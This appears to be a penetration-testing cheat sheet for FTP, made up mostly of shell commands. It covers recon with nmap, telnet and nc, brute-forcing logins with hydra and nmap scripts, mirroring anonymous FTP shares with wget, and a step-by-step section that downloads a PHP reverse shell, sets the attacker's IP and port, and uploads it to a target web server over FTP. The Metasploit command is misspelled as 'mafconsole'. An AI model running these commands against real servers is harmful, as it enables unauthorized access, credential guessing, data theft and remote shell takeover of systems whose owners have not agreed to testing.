# FTP (File Transfer Protocol)

	- Default Port: 21
	- Used for transferring files from one host to another over a TCP-based network
	- FTP operates on a client-server model
	- **The protocol supports anonymous access, where users can log in with a common username like 'anonymous' or 'ftp', and authenticated access, where a username and password are required.**


### Connect Using FTP Command
```bash
ftp <target-ip> <target-port>  #target port is optional

ftp://username:password@$TARGET

lftp $TARGET #lftp is the enhanced version of ftp. It's easier to use than ftp.

```

### Recon

```bash
nmap -p 21 $TARGET

telnet $TARGET 21  # ctrl+]

nc -v $target 21
```

### Enumeration
```bash
nmap -p 21 --script ftp-features <target-ip>

gobuster dir -u ftp://<target-ip> -w <wordlist-path>
```

### Bruteforcing Credentials
```bash
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://$target

nmap -p 21 --script ftp-brute $target

```

### Exploit
```bash
mafconsole > search ftp exploit

```


### Download All Files
```bash
wget -m ftp://anonymous:anonymous@X.X.X.X


```

### Reverse Shell over Website

```bash

# 1.Download the payload

wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

# 2.Edit some variables in shell.php
$ip = '<your-local-ip>';
$port = 1234;

# 3.Connect to the FTP server and upload the payload.
ftp <target-ip>

# Upload the payload you downloaded
ftp> put shell.php